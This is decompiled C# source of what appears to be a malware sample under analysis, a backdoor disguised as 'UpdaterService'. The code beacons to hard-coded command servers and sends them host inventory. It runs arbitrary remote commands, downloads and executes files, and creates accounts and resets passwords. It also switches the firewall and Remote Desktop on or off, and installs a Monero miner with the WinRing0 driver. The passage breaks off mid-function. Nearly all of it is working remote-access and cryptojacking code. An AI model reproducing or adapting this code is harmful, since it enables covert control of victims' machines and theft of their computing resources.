// Decompiled with JetBrains decompiler
// Type: UpdaterService.FunctionBox
// Assembly: UpdaterService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1FB66A7F-8AE7-472D-85E4-A0D54D3018CC
// Assembly location: C:\Users\flareadmin\Downloads\0f6572e1184084cd1257731eaa6e44af30a46a69679630a87065da9dccd0c32b.exe

using Microsoft.CSharp.RuntimeBinder;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.DirectoryServices.AccountManagement;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Threading;

namespace UpdaterService
{
  internal class FunctionBox
  {
    private PerformanceCounter RAM_Using = new PerformanceCounter();
    public static string AddressServer = "hxxp://updatesrv2.bounceme.net/update/getdata.php";
    public static string helper = "hxxp://updatesrv2.bounceme.net/update/file/helper.exe";
    public static string WinRing0x64 = "hxxp://updatesrv2.bounceme.net/update/file/WinRing0x64.sys";
    public static string listDateLoginUsers = "";
    public static string CPU = "";
    public static string CPUHelper = "";
    public static int CountOnlineuser = 0;
    public static bool FlagOnlineuser = false;

    public static void CheckConnectToServer()
    {
      try
      {
        Ping ping = new Ping();
        string hostNameOrAddress = "updatesrv2.bounceme.net";
        byte[] buffer = new byte[32];
        int timeout = 1000;
        PingOptions options = new PingOptions();
        ping.Send(hostNameOrAddress, timeout, buffer, options);
        FunctionBox.AddressServer = "hxxp://updatesrv2.bounceme.net/update/getdata.php";
        FunctionBox.helper = "hxxp://updatesrv2.bounceme.net/update/file/helper.exe";
        FunctionBox.WinRing0x64 = "hxxp://updatesrv2.bounceme.net/update/file/WinRing0x64.sys";
      }
      catch
      {
        FunctionBox.AddressServer = "hxxp://s1-dynamic-v3.webredirect.org/update/getdata.php";
        FunctionBox.helper = "hxxp://s1-dynamic-v3.webredirect.org/update/file/helper.exe";
        FunctionBox.WinRing0x64 = "hxxp://s1-dynamic-v3.webredirect.org/update/file/WinRing0x64.sys";
      }
    }

    public static string InfoPortRDP()
    {
      using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", false))
        return registryKey == null ? "" : ((int) registryKey.GetValue("PortNumber", (object) 3389)).ToString();
    }

    public static string GetIPAddress()
    {
      string str = "";
      using (WebResponse response = WebRequest.Create("hxxp://checkip.dyndns.org/").GetResponse())
      {
        using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))
          str = streamReader.ReadToEnd();
      }
      int startIndex = str.IndexOf("Address: ") + 9;
      int num = str.LastIndexOf("</body>");
      return str.Substring(startIndex, num - startIndex);
    }

    public static string GetIPAddress2() => new WebClient().DownloadString("hxxp://icanhazip.com");

    public static string InfoMaxClockSpeed()
    {
      string str = "";
      foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("select MaxClockSpeed from Win32_Processor").Get())
        str = managementBaseObject["MaxClockSpeed"].ToString();
      return str;
    }

    public static string InfoTickCount()
    {
      using (PerformanceCounter performanceCounter = new PerformanceCounter("System", "System Up Time"))
      {
        double num = (double) performanceCounter.NextValue();
        return TimeSpan.FromSeconds((double) performanceCounter.NextValue()).ToString();
      }
    }

    public static string InfoMachineName() => Environment.MachineName.ToString();

    public static string InfoLogicalProcessor() => Environment.ProcessorCount.ToString();

    public static string InfoUserName() => Environment.UserName.ToString();

    public static string InfoListUsers()
    {
      string str = "";
      foreach (ManagementObject managementObject in new ManagementObjectSearcher((ObjectQuery) new SelectQuery("Win32_UserAccount")).Get())
        str = str + managementObject["Name"] + "/";
      return str;
    }

    public static string OSName()
    {
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: method pointer
      object obj = ((IEnumerable<object>) Enumerable.Select<ManagementObject, object>((IEnumerable<M0>) new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().Cast<ManagementObject>(), (Func<M0, M1>) (FunctionBox.\u003C\u003Ec.\u003C\u003E9__19_0 ?? (FunctionBox.\u003C\u003Ec.\u003C\u003E9__19_0 = new Func<ManagementObject, object>((object) FunctionBox.\u003C\u003Ec.\u003C\u003E9, __methodptr(\u003COSName\u003Eb__19_0)))))).FirstOrDefault<object>();
      return obj != null ? obj.ToString() : "Unknown";
    }

    public static void SendDataInfo()
    {
      string str1 = "0";
      string str2 = "0";
      try
      {
        str1 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ServiceServerUpdate", "IDAdmin", (object) "100").ToString();
      }
      catch
      {
        try
        {
          Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ServiceServerUpdate", "IDAdmin", (object) "100");
        }
        catch
        {
        }
      }
      try
      {
        str2 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ServiceServerUpdate", "VerController", (object) "1.2").ToString();
      }
      catch
      {
        try
        {
          Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ServiceServerUpdate", "VerController", (object) "1.2");
        }
        catch
        {
        }
      }
      try
      {
        string str3 = !FunctionBox.StatusRemoteDesktop() ? "On" : "Off";
        using (WebClient webClient = new WebClient())
        {
          NameValueCollection nameValueCollection = new NameValueCollection();
          nameValueCollection.Add("key", "infoServer");
          nameValueCollection.Add("status", "Enter");
          nameValueCollection.Add("ip", FunctionBox.GetIPAddress());
          nameValueCollection.Add("InfoMachineName", FunctionBox.InfoMachineName());
          nameValueCollection.Add("InfoLogicalProcessor", FunctionBox.InfoLogicalProcessor());
          nameValueCollection.Add("InfoTickCount", FunctionBox.InfoTickCount());
          nameValueCollection.Add("InfoUserName", FunctionBox.InfoUserName());
          nameValueCollection.Add("InfoMaxClockSpeed", FunctionBox.InfoMaxClockSpeed());
          nameValueCollection.Add("InfoListUsers", FunctionBox.InfoListUsers());
          nameValueCollection.Add("InfoPortRDP", FunctionBox.InfoPortRDP());
          nameValueCollection.Add("InfoRounded_CPU_Usage", FunctionBox.CPU);
          nameValueCollection.Add("InfoRounded_Helper_Usage", FunctionBox.CPUHelper);
          nameValueCollection.Add("InfoTotalPhysicalMemory", FunctionBox.InfoTotalPhysicalMemory());
          nameValueCollection.Add("InfoTotalSizeHard", FunctionBox.InfoTotalSizeHard());
          nameValueCollection.Add("InfoModelCPU", FunctionBox.InfoModelCPU());
          nameValueCollection.Add("DateLastloginUsers", FunctionBox.listDateLoginUsers);
          DateTime dateTime = FunctionBox.GetWindowsInstallationDateTime(FunctionBox.InfoMachineName());
          nameValueCollection.Add("DataInsertWin", dateTime.ToString());
          nameValueCollection.Add("CheckMiner", FunctionBox.CheckMiner());
          nameValueCollection.Add("CheckXmrig", FunctionBox.CheckXmrig());
          nameValueCollection.Add("NumberVer", "1.4");
          nameValueCollection.Add("CheckNLbrute", FunctionBox.CheckNLbrute().ToString());
          nameValueCollection.Add("CheckNLChecker", FunctionBox.CheckNLChecker().ToString());
          nameValueCollection.Add("CheckRemoteDesktop", FunctionBox.CheckRemoteDesktop().ToString());
          nameValueCollection.Add("CheckMasscan", FunctionBox.CheckMasscan().ToString());
          nameValueCollection.Add("CheckWinSCP", FunctionBox.CheckWinSCP().ToString());
          nameValueCollection.Add("CheckOnlineUser", FunctionBox.CheckOnlineUser().ToString());
          nameValueCollection.Add("IDAdmin", str1);
          nameValueCollection.Add("StatusFirewall", FunctionBox.StatusFirewall().ToString());
          nameValueCollection.Add("StatusRemoteDesktop", str3.ToString());
          nameValueCollection.Add("OS", FunctionBox.OSName());
          nameValueCollection.Add("Graphic", FunctionBox.GetGraphic());
          nameValueCollection.Add("Graphic2", FunctionBox.GetGraphic2());
          nameValueCollection.Add("Unique", FunctionBox.GetCPUId());
          nameValueCollection.Add("MacAddresses", FunctionBox.GetmacAddresses());
          dateTime = DateTime.Now;
          nameValueCollection.Add("DateServer", dateTime.ToString("dd/MM/yyyy"));
          dateTime = DateTime.Now;
          nameValueCollection.Add("TimeServer", dateTime.ToString("HH:mm:ss"));
          nameValueCollection.Add("VerController", str2);
          nameValueCollection.Add("LanguageWindows", FunctionBox.LanguageWindows());
          NameValueCollection data = nameValueCollection;
          Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data));
        }
      }
      catch
      {
      }
    }

    public static void SendDataRestart()
    {
      string str = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ServiceServerUpdate", "IDAdmin", (object) "0").ToString();
      try
      {
        using (WebClient webClient = new WebClient())
        {
          NameValueCollection data1 = new NameValueCollection()
          {
            {
              "key",
              "restart"
            },
            {
              "status",
              "wait"
            },
            {
              "ip",
              FunctionBox.GetIPAddress()
            },
            {
              "IDAdmin",
              str
            }
          };
          if (!(Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data1)) == "restart_ok"))
            return;
          FunctionBox.RestartSystem();
          NameValueCollection data2 = new NameValueCollection()
          {
            {
              "key",
              "restart"
            },
            {
              "status",
              "successfully"
            },
            {
              "ip",
              FunctionBox.GetIPAddress()
            },
            {
              "IDAdmin",
              str
            }
          };
          Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data2));
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static void SendDataCreateUser()
    {
      string str1 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ServiceServerUpdate", "IDAdmin", (object) "0").ToString();
      try
      {
        using (WebClient webClient = new WebClient())
        {
          NameValueCollection data1 = new NameValueCollection()
          {
            {
              "key",
              "CreateUserNew"
            },
            {
              "status",
              "wait"
            },
            {
              "ip",
              FunctionBox.GetIPAddress()
            },
            {
              "IDAdmin",
              str1
            }
          };
          string str2 = Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data1));
          if (!(str2 != "noCreate"))
            return;
          string[] strArray = str2.Split('|');
          if (!FunctionBox.UserExists(strArray[0]) && strArray[2] == "Create")
          {
            FunctionBox.createUser(strArray[0], strArray[1]);
            NameValueCollection data2 = new NameValueCollection()
            {
              {
                "key",
                "CreateUserNew"
              },
              {
                "status",
                !FunctionBox.UserExists(strArray[0]) ? "Not successfully " : "successfully"
              },
              {
                "ip",
                FunctionBox.GetIPAddress()
              },
              {
                "IDAdmin",
                str1
              }
            };
            Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data2));
          }
          if (strArray[2] == "Reset" && FunctionBox.UserExists(strArray[0]))
          {
            FunctionBox.ResetAdminPass(FunctionBox.InfoUserName(), strArray[1]);
            NameValueCollection data2 = new NameValueCollection()
            {
              {
                "key",
                "CreateUserNew"
              },
              {
                "status",
                "successfully"
              },
              {
                "ip",
                FunctionBox.GetIPAddress()
              },
              {
                "IDAdmin",
                str1
              }
            };
            Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data2));
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static void SendDataRemote()
    {
      string str1 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ServiceServerUpdate", "IDAdmin", (object) "0").ToString();
      try
      {
        using (WebClient webClient = new WebClient())
        {
          NameValueCollection data1 = new NameValueCollection()
          {
            {
              "key",
              "Remote"
            },
            {
              "status",
              "wait"
            },
            {
              "ip",
              FunctionBox.GetIPAddress()
            },
            {
              "IDAdmin",
              str1
            }
          };
          string str2 = Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data1));
          if (str2 == "Remote_ON")
          {
            FunctionBox.ChangeStatusRemoteDesktop(true);
            NameValueCollection data2 = new NameValueCollection()
            {
              {
                "key",
                "Remote"
              },
              {
                "status",
                "successfully"
              },
              {
                "ip",
                FunctionBox.GetIPAddress()
              },
              {
                "IDAdmin",
                str1
              }
            };
            Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data2));
          }
          if (!(str2 == "Remote_OFF"))
            return;
          FunctionBox.ChangeStatusRemoteDesktop(false);
          NameValueCollection data3 = new NameValueCollection()
          {
            {
              "key",
              "Remote"
            },
            {
              "status",
              "successfully"
            },
            {
              "ip",
              FunctionBox.GetIPAddress()
            },
            {
              "IDAdmin",
              str1
            }
          };
          Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data3));
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static void SendDataFirewall()
    {
      string str1 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ServiceServerUpdate", "IDAdmin", (object) "0").ToString();
      try
      {
        using (WebClient webClient = new WebClient())
        {
          NameValueCollection data1 = new NameValueCollection()
          {
            {
              "key",
              "Firewall"
            },
            {
              "status",
              "wait"
            },
            {
              "ip",
              FunctionBox.GetIPAddress()
            },
            {
              "IDAdmin",
              str1
            }
          };
          string str2 = Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data1));
          if (str2 == "Firewall_ON")
          {
            using (CmdService cmdService = new CmdService("cmd.exe"))
            {
              string empty = string.Empty;
              string command = "NetSh Advfirewall set allprofiles state on ";
              cmdService.ExecuteCommand(command);
              cmdService.Dispose();
            }
            NameValueCollection data2 = new NameValueCollection()
            {
              {
                "key",
                "Firewall"
              },
              {
                "status",
                "successfully"
              },
              {
                "ip",
                FunctionBox.GetIPAddress()
              },
              {
                "IDAdmin",
                str1
              }
            };
            Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data2));
          }
          if (!(str2 == "Firewall_OFF"))
            return;
          using (CmdService cmdService = new CmdService("cmd.exe"))
          {
            string empty = string.Empty;
            string command = "NetSh Advfirewall set allprofiles state off ";
            cmdService.ExecuteCommand(command);
            cmdService.Dispose();
          }
          NameValueCollection data3 = new NameValueCollection()
          {
            {
              "key",
              "Firewall"
            },
            {
              "status",
              "successfully"
            },
            {
              "ip",
              FunctionBox.GetIPAddress()
            },
            {
              "IDAdmin",
              str1
            }
          };
          Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data3));
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static void SendDataSupportXmr()
    {
      string str1 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ServiceServerUpdate", "IDAdmin", (object) "0").ToString();
      try
      {
        string str2 = "";
        using (WebClient webClient = new WebClient())
        {
          NameValueCollection data = new NameValueCollection()
          {
            {
              "ip",
              FunctionBox.GetIPAddress()
            },
            {
              "key",
              "CheckSupportXmr"
            },
            {
              "status",
              "wait"
            },
            {
              "IDAdmin",
              str1
            }
          };
          str2 = Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data));
        }
        if (!(str2 != "no"))
          return;
        string[] strArray = str2.Split('|');
        string str3 = "";
        try
        {
          str3 = WindowsIdentity.GetCurrent().Name.Split('\\')[1].ToString();
        }
        catch
        {
          str3 = "Administrator";
        }
        string str4 = "";
        if (strArray[3] == "Start" && strArray[4] == "Not")
        {
          try
          {
            foreach (Process process in Process.GetProcesses())
            {
              if (process.ProcessName == "helper")
                process.Kill();
            }
            foreach (Process process in Process.GetProcesses())
            {
              if (process.ProcessName == "help")
                process.Kill();
            }
          }
          catch
          {
          }
          try
          {
            foreach (Process process in Process.GetProcesses())
            {
              if (process.ProcessName == "xmrig")
                process.Kill();
            }
          }
          catch
          {
          }
          if (FunctionBox.CheckMiner() == "Off" && strArray[1] != "" && (strArray[2] != "" && strArray[1] != null) && strArray[2] != null)
          {
            try
            {
              if (System.IO.File.Exists("C:\\Users\\SupportXmr.cmd"))
                System.IO.File.Delete("C:\\Users\\SupportXmr.cmd");
            }
            catch
            {
            }
            using (StreamWriter streamWriter = new StreamWriter("C:\\Users\\SupportXmr.cmd", true))
            {
              streamWriter.WriteLine("cd C:\\");
              streamWriter.WriteLine("cd C:\\Users\\");
              streamWriter.WriteLine("cd SupportXmr.cmd");
              streamWriter.WriteLine("help.exe --donate-level 0 -o pool.supportxmr.com:5555 -u " + strArray[2] + "  -p " + strArray[0] + "  -k --b -t " + strArray[1]);
            }
            if (!System.IO.File.Exists("C:\\Users\\help.exe"))
            {
              FunctionBox.DownloadFile(FunctionBox.helper, "C:\\Users\\help.exe");
              Thread.Sleep(5000);
            }
            if (!System.IO.File.Exists("C:\\Users\\WinRing0x64.sys"))
            {
              FunctionBox.DownloadFile(FunctionBox.WinRing0x64, "C:\\Users\\WinRing0x64.sys");
              Thread.Sleep(5000);
            }
            try
            {
              if (System.IO.File.Exists("C:\\Users\\SupportXmr.cmd"))
                Process.Start("C:\\Users\\SupportXmr.cmd");
            }
            catch
            {
            }
            Thread.Sleep(5000);
            try
            {
              if (System.IO.File.Exists("C:\\Users\\SupportXmr.cmd"))
                System.IO.File.Delete("C:\\Users\\SupportXmr.cmd");
            }
            catch
            {
            }
            if (!System.IO.File.Exists("C:\\Users\\help.exe") || !System.IO.File.Exists("C:\\Users\\WinRing0x64.sys"))
              str4 = "No File SupportXmr";
            else if (FunctionBox.CheckMiner() == "On")
              str4 = "Run";
            else if (FunctionBox.CheckMiner() == "Off")
              str4 = "NoRun";
            using (WebClient webClient = new WebClient())
            {
              NameValueCollection data = new NameValueCollection()
              {
                {
                  "ip",
                  FunctionBox.GetIPAddress()
                },
                {
                  "key",
                  "CheckSupportXmr"
                },
                {
                  "status",
                  str4
                },
                {
                  "IDAdmin",
                  str1
                }
              };
              Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data));
            }
          }
          if (!System.IO.File.Exists("C:\\Users\\help.exe") || !System.IO.File.Exists("C:\\Users\\WinRing0x64.sys"))
            str4 = "No File SupportXmr";
          else if (FunctionBox.CheckMiner() == "On")
            str4 = "Run";
          else if (FunctionBox.CheckMiner() == "Off")
            str4 = "NoRun";
          using (WebClient webClient = new WebClient())
          {
            NameValueCollection data = new NameValueCollection()
            {
              {
                "ip",
                FunctionBox.GetIPAddress()
              },
              {
                "key",
                "CheckSupportXmr"
              },
              {
                "status",
                str4
              },
              {
                "IDAdmin",
                str1
              }
            };
            Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data));
          }
        }
        else if (strArray[3] == "No")
        {
          try
          {
            foreach (Process process in Process.GetProcesses())
            {
              if (process.ProcessName == "helper")
                process.Kill();
            }
            foreach (Process process in Process.GetProcesses())
            {
              if (process.ProcessName == "help")
                process.Kill();
            }
          }
          catch
          {
          }
          try
          {
            foreach (Process process in Process.GetProcesses())
            {
              if (process.ProcessName == "xmrig")
                process.Kill();
            }
          }
          catch
          {
          }
          try
          {
            if (System.IO.File.Exists("C:\\Users\\SupportXmr.cmd"))
              System.IO.File.Delete("C:\\Users\\SupportXmr.cmd");
          }
          catch
          {
          }
          using (WebClient webClient = new WebClient())
          {
            NameValueCollection data = new NameValueCollection()
            {
              {
                "ip",
                FunctionBox.GetIPAddress()
              },
              {
                "key",
                "CheckSupportXmr"
              },
              {
                "status",
                "Stop"
              },
              {
                "IDAdmin",
                str1
              }
            };
            Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data));
          }
        }
        else if (strArray[4] != "Not" && strArray[3] == "Start")
        {
          try
          {
            foreach (Process process in Process.GetProcesses())
            {
              if (process.ProcessName == "helper")
                process.Kill();
            }
            foreach (Process process in Process.GetProcesses())
            {
              if (process.ProcessName == "help")
                process.Kill();
            }
          }
          catch
          {
          }
          try
          {
            foreach (Process process in Process.GetProcesses())
            {
              if (process.ProcessName == "xmrig")
                process.Kill();
            }
          }
          catch
          {
          }
          try
          {
            if (System.IO.File.Exists("C:\\Users\\SupportXmr.cmd"))
              System.IO.File.Delete("C:\\Users\\SupportXmr.cmd");
          }
          catch
          {
          }
          using (StreamWriter streamWriter = new StreamWriter("C:\\Users\\SupportXmr.cmd", true))
          {
            streamWriter.WriteLine("cd C:\\");
            streamWriter.WriteLine("cd C:\\Users\\");
            streamWriter.WriteLine("cd SupportXmr.cmd");
            streamWriter.WriteLine(strArray[4]);
          }
          if (!System.IO.File.Exists("C:\\Users\\help.exe"))
          {
            FunctionBox.DownloadFile(FunctionBox.helper, "C:\\Users\\help.exe");
            Thread.Sleep(5000);
          }
          if (!System.IO.File.Exists("C:\\Users\\WinRing0x64.sys"))
          {
            FunctionBox.DownloadFile(FunctionBox.WinRing0x64, "C:\\Users\\WinRing0x64.sys");
            Thread.Sleep(5000);
          }
          try
          {
            if (System.IO.File.Exists("C:\\Users\\SupportXmr.cmd"))
              Process.Start("C:\\Users\\SupportXmr.cmd");
          }
          catch
          {
          }
          Thread.Sleep(10000);
          try
          {
            if (System.IO.File.Exists("C:\\Users\\SupportXmr.cmd"))
              System.IO.File.Delete("C:\\Users\\SupportXmr.cmd");
          }
          catch
          {
          }
          if (!System.IO.File.Exists("C:\\Users\\help.exe") || !System.IO.File.Exists("C:\\Users\\WinRing0x64.sys"))
            str4 = "No File SupportXmr";
          else if (FunctionBox.CheckMiner() == "On")
            str4 = "Run";
          else if (FunctionBox.CheckMiner() == "Off")
            str4 = "NoRun";
          using (WebClient webClient = new WebClient())
          {
            NameValueCollection data = new NameValueCollection()
            {
              {
                "ip",
                FunctionBox.GetIPAddress()
              },
              {
                "status",
                str4
              },
              {
                "key",
                "CheckSupportXmr"
              },
              {
                "IDAdmin",
                str1
              }
            };
            Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data));
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static void SendDataListPross()
    {
      string str = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ServiceServerUpdate", "IDAdmin", (object) "0").ToString();
      try
      {
        using (WebClient webClient = new WebClient())
        {
          NameValueCollection data1 = new NameValueCollection()
          {
            {
              "key",
              "ListPross"
            },
            {
              "status",
              "wait"
            },
            {
              "ip",
              FunctionBox.GetIPAddress()
            },
            {
              "IDAdmin",
              str
            }
          };
          if (!(Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data1)) == "Get_pross"))
            return;
          NameValueCollection data2 = new NameValueCollection()
          {
            {
              "key",
              "ListPross"
            },
            {
              "status",
              "successfully"
            },
            {
              "res",
              FunctionBox.ListProcesses()
            },
            {
              "ip",
              FunctionBox.GetIPAddress()
            },
            {
              "IDAdmin",
              str
            }
          };
          Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data2));
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static void SendDataListNetworkInterface()
    {
      string str = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ServiceServerUpdate", "IDAdmin", (object) "0").ToString();
      try
      {
        using (WebClient webClient = new WebClient())
        {
          NameValueCollection data1 = new NameValueCollection()
          {
            {
              "key",
              "ListNetworkInterface"
            },
            {
              "status",
              "wait"
            },
            {
              "ip",
              FunctionBox.GetIPAddress()
            },
            {
              "IDAdmin",
              str
            }
          };
          if (!(Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data1)) == "Get_NetworkInterface"))
            return;
          NameValueCollection data2 = new NameValueCollection()
          {
            {
              "key",
              "ListNetworkInterface"
            },
            {
              "status",
              "successfully"
            },
            {
              "res",
              FunctionBox.GetNetworkInterface()
            },
            {
              "ip",
              FunctionBox.GetIPAddress()
            },
            {
              "IDAdmin",
              str
            }
          };
          Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data2));
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static void SendDataCmd()
    {
      string str1 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ServiceServerUpdate", "IDAdmin", (object) "0").ToString();
      try
      {
        using (WebClient webClient = new WebClient())
        {
          NameValueCollection data1 = new NameValueCollection()
          {
            {
              "key",
              "Cmd"
            },
            {
              "status",
              "wait"
            },
            {
              "ip",
              FunctionBox.GetIPAddress()
            },
            {
              "IDAdmin",
              str1
            }
          };
          string str2 = Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data1));
          if (!(str2 != "no"))
            return;
          string[] strArray = str2.Split('|');
          if (strArray[0] != "" && strArray[1] == "Run")
          {
            string str3 = "";
            using (CmdService cmdService = new CmdService("cmd.exe"))
            {
              string empty = string.Empty;
              string command = strArray[0];
              str3 = cmdService.ExecuteCommand(command);
              cmdService.Dispose();
            }
            NameValueCollection data2 = new NameValueCollection()
            {
              {
                "key",
                "Cmd"
              },
              {
                "res",
                str3
              },
              {
                "status",
                "successfully"
              },
              {
                "ip",
                FunctionBox.GetIPAddress()
              },
              {
                "IDAdmin",
                str1
              }
            };
            Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data2));
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static void SendDataDownload()
    {
      string str1 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ServiceServerUpdate", "IDAdmin", (object) "0").ToString();
      try
      {
        using (WebClient webClient = new WebClient())
        {
          NameValueCollection data1 = new NameValueCollection()
          {
            {
              "key",
              "Download"
            },
            {
              "status",
              "wait"
            },
            {
              "ip",
              FunctionBox.GetIPAddress()
            },
            {
              "IDAdmin",
              str1
            }
          };
          string str2 = Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data1));
          if (!(str2 != "no"))
            return;
          string[] strArray = str2.Split('|');
          if (strArray[0] != "" && strArray[1] != "")
          {
            FunctionBox.DownloadFile(strArray[0], strArray[1]);
            Thread.Sleep(5000);
            for (int index = 0; index < 30; ++index)
              Thread.Sleep(1000);
            if (strArray[2] == "Run")
              new Process()
              {
                StartInfo = {
                  FileName = strArray[1]
                }
              }.Start();
            NameValueCollection data2 = new NameValueCollection()
            {
              {
                "key",
                "Download"
              },
              {
                "status",
                "successfully"
              },
              {
                "ip",
                FunctionBox.GetIPAddress()
              },
              {
                "IDAdmin",
                str1
              }
            };
            Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data2));
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static void SendDataCounterOnline()
    {
      string str = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ServiceServerUpdate", "IDAdmin", (object) "0").ToString();
      try
      {
        if (!(FunctionBox.CheckOnlineUser() == "Online") || !FunctionBox.FlagOnlineuser)
          return;
        ++FunctionBox.CountOnlineuser;
        using (WebClient webClient = new WebClient())
        {
          NameValueCollection data = new NameValueCollection()
          {
            {
              "key",
              "CounterOnline"
            },
            {
              "status",
              "successfully"
            },
            {
              "res",
              FunctionBox.CountOnlineuser.ToString()
            },
            {
              "ip",
              FunctionBox.GetIPAddress()
            },
            {
              "IDAdmin",
              str
            }
          };
          Encoding.UTF8.GetString(webClient.UploadValues(FunctionBox.AddressServer, data));
          FunctionBox.FlagOnlineuser = false;
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static string CheckOnlineUser()
    {
      try
      {
        string str = "";
        using (CmdService cmdService = new CmdService("cmd.exe"))
        {
          string empty = string.Empty;
          string command = "query user";
          str = cmdService.ExecuteCommand(command);
          cmdService.Dispose();
        }
        if (str.Contains("Active") || str.Contains("Активно"))
          return "Online";
        FunctionBox.FlagOnlineuser = true;
        return "Offline";
      }
      catch (Exception ex)
      {
      }
      return "Online";
    }

    public static string ListProcesses()
    {
      try
      {
        string str = "";
        foreach (Process process in Process.GetProcesses())
          str = str + process.ProcessName + " | ";
        return str;
      }
      catch (Exception ex)
      {
      }
      return "";
    }

    public static void ResetAdminPass(string Username, string NewPass)
    {
      try
      {
        Process process = new Process();
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.WorkingDirectory = "C:\\windows\\SYSTEM32";
        process.StartInfo.FileName = "net.exe";
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.RedirectStandardInput = true;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.Arguments = " user " + Username + " " + NewPass;
        process.Start();
        process.Close();
      }
      catch (Exception ex)
      {
      }
    }

    public static void RestartSystem()
    {
      try
      {
        using (CmdService cmdService = new CmdService("cmd.exe"))
        {
          string empty = string.Empty;
          string command = "shutdown /r";
          cmdService.ExecuteCommand(command);
          cmdService.Dispose();
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static void InfoRounded_CPU_Usage()
    {
      try
      {
        PerformanceCounter performanceCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
        Thread.Sleep(1000);
        performanceCounter.NextValue();
        while (true)
        {
          Thread.Sleep(1000);
          FunctionBox.CPU = Convert.ToInt32(performanceCounter.NextValue()).ToString() + "%";
        }
      }
      catch
      {
      }
    }

    public static void InfoRounded_Helper_Usage()
    {
      while (true)
      {
        Thread.Sleep(10000);
        try
        {
          PerformanceCounter performanceCounter = new PerformanceCounter("Process", "% Processor Time", "help");
          double num = (double) performanceCounter.NextValue();
          while (true)
          {
            Thread.Sleep(1000);
            FunctionBox.CPUHelper = Convert.ToInt32(performanceCounter.NextValue() / (float) Environment.ProcessorCount).ToString() + "%";
          }
        }
        catch
        {
          FunctionBox.CPUHelper = "0 %";
        }
      }
    }

    public static string InfoTotalPhysicalMemory()
    {
      try
      {
        float num = (float) (ulong.Parse(new ComputerInfo().TotalPhysicalMemory.ToString()) / 1048576UL);
        if ((double) num < 1024.0 && (double) num > 1000.0)
          return "1 GB";
        return (double) num < 1000.0 ? num.ToString() + " GB" : string.Format("{0:n1}", (object) (float) ((double) num / 1024.0)) + " GB";
      }
      catch (Exception ex)
      {
      }
      return "";
